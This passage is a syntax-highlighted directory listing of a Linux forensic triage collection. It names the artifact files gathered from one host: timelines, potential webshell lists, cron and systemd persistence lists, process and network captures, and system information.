</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root    <span style="color:#bd93f9">360</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>whoandwhat<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span>drwxrwxrwx <span style="color:#bd93f9">12</span> root root   <span style="color:#bd93f9">4096</span> May <span style="color:#bd93f9">27</span> <span style="color:#bd93f9">10</span>:<span style="color:#bd93f9">10</span> varlogs
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Misc:
</span></span><span style="display:flex;"><span>total <span style="color:#bd93f9">74804</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root      <span style="color:#bd93f9">559</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>Setuid<span style="color:#ff79c6">-</span>Setguid<span style="color:#ff79c6">-</span>tools<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root       <span style="color:#bd93f9">62</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>dev<span style="color:#ff79c6">-</span>dir<span style="color:#ff79c6">-</span>files<span style="color:#ff79c6">-</span>hashes<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root       <span style="color:#bd93f9">92</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>dev<span style="color:#ff79c6">-</span>dir<span style="color:#ff79c6">-</span>files<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">384887</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>exec<span style="color:#ff79c6">-</span>perm<span style="color:#ff79c6">-</span>files<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root <span style="color:#bd93f9">34211795</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>full<span style="color:#ff79c6">-</span>timeline<span style="color:#ff79c6">.</span>csv
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root <span style="color:#bd93f9">41585177</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>pot<span style="color:#ff79c6">-</span>webshell<span style="color:#ff79c6">-</span>first<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1000.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">392840</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>pot<span style="color:#ff79c6">-</span>webshell<span style="color:#ff79c6">-</span>hashes<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Persistence:
</span></span><span style="display:flex;"><span>total <span style="color:#bd93f9">116</span>
</span></span><span style="display:flex;"><span>drwxrwxrwx <span style="color:#bd93f9">2</span> root root  <span style="color:#bd93f9">4096</span> May <span style="color:#bd93f9">27</span> <span style="color:#bd93f9">10</span>:<span style="color:#bd93f9">10</span> crontabs
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">120</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>cron<span style="color:#ff79c6">-</span>folder<span style="color:#ff79c6">-</span>list<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">147</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>cron<span style="color:#ff79c6">-</span>tab<span style="color:#ff79c6">-</span>list<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root <span style="color:#bd93f9">45449</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>persistence<span style="color:#ff79c6">-</span>systemdlist<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">775</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>service_status<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root <span style="color:#bd93f9">27513</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>systemctl_all<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root <span style="color:#bd93f9">23761</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>systemctl_service_status<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Podman:
</span></span><span style="display:flex;"><span>total <span style="color:#bd93f9">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Process_and_Network:
</span></span><span style="display:flex;"><span>total <span style="color:#bd93f9">5008</span>
</span></span><span style="display:flex;"><span>drwxrwxrwx <span style="color:#bd93f9">3</span> root root    <span style="color:#bd93f9">4096</span> May <span style="color:#bd93f9">27</span> <span style="color:#bd93f9">10</span>:<span style="color:#bd93f9">10</span> cyberjunkie_admin
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root     <span style="color:#bd93f9">671</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>ip<span style="color:#ff79c6">-</span>a<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root     <span style="color:#bd93f9">439</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>iptables<span style="color:#ff79c6">-</span>numerical<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root     <span style="color:#bd93f9">275</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>iptables<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root       <span style="color:#bd93f9">0</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>lsof<span style="color:#ff79c6">-</span>list<span style="color:#ff79c6">-</span>open<span style="color:#ff79c6">-</span>files<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root    <span style="color:#bd93f9">5474</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>process<span style="color:#ff79c6">-</span>cmdline<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root  <span style="color:#bd93f9">148446</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>process<span style="color:#ff79c6">-</span>details<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">28377</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>process<span style="color:#ff79c6">-</span>environment<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">11080</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>process<span style="color:#ff79c6">-</span>exe<span style="color:#ff79c6">-</span>links<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root  <span style="color:#bd93f9">111180</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>process<span style="color:#ff79c6">-</span>fd<span style="color:#ff79c6">-</span>links<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root <span style="color:#bd93f9">1241355</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>process<span style="color:#ff79c6">-</span>map_files<span style="color:#ff79c6">-</span>link<span style="color:#ff79c6">-</span>hashes<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root <span style="color:#bd93f9">3463139</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>process<span style="color:#ff79c6">-</span>map_files<span style="color:#ff79c6">-</span>links<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">11524</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>processes<span style="color:#ff79c6">-</span>axwwSo<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root    <span style="color:#bd93f9">2991</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>processhashes<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root     <span style="color:#bd93f9">211</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>routetable<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">49785</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>ss<span style="color:#ff79c6">-</span>anepo<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx <span style="color:#bd93f9">1</span> root root     <span style="color:#bd93f9">190</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>ssh<span style="color:#ff79c6">-</span>folders<span style="color:#ff79c6">-</span>list<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span>drwxrwxrwx <span style="color:#bd93f9">3</span> root root    <span style="color:#bd93f9">4096</span> May <span style="color:#bd93f9">27</span> <span style="color:#bd93f9">10</span>:<span style="color:#bd93f9">10</span> root
</span></span><span style="display:flex;"><span>drwxrwxrwx <span style="color:#bd93f9">3</span> root root    <span style="color:#bd93f9">4096</span> May <span style="color:#bd93f9">27</span> <span style="color:#bd93f9">10</span>:<span style="color:#bd93f9">10</span> ubuntu
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>System_Info:
</span></span><span style="display:flex;"><span>total <span style="color:#bd93f9">340</span>
</span></span><span style="display:flex;"><span>drwxrwxrwx <span style="color:#bd93f9">30</span> root root   <span style="color:#bd93f9">4096</span> May <span style="color:#bd93f9">27</span> <span style="color:#bd93f9">10</span>:<span style="color:#bd93f9">10</span> etc<span style="color:#ff79c6">-</span>modified<span style="color:#ff79c6">-</span>files
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">1968</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>cpuinfo<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root     <span style="color:#bd93f9">76</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>deb<span style="color:#ff79c6">-</span>package<span style="color:#ff79c6">-</span>verify<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root <span style="color:#bd93f9">104466</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>deb<span style="color:#ff79c6">-</span>packages<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root   <span style="color:#bd93f9">1126</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>df<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root  <span style="color:#bd93f9">54667</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>dmesg<span style="color:#ff79c6">.</span>txt
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span>rwxrwxrwx  <span style="color:#bd93f9">1</span> root root      <span style="color:#bd93f9">0</span> Aug  <span style="color:#bd93f9">8</span>  <span style="color:#bd93f9">2023</span> ip<span style="color:#ff79c6">-</span><span style="color:#bd93f9">172</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">31</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">11</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">131</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">20230808</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0937</span><span style="color:#ff79c6">-</span>etc<span style="color:#ff79c6">-</span>key<span style="color:#ff79c6">-</span>files<span style="color:#ff79c6">-</span>list<span style="color:#ff79c6">.</span>txt
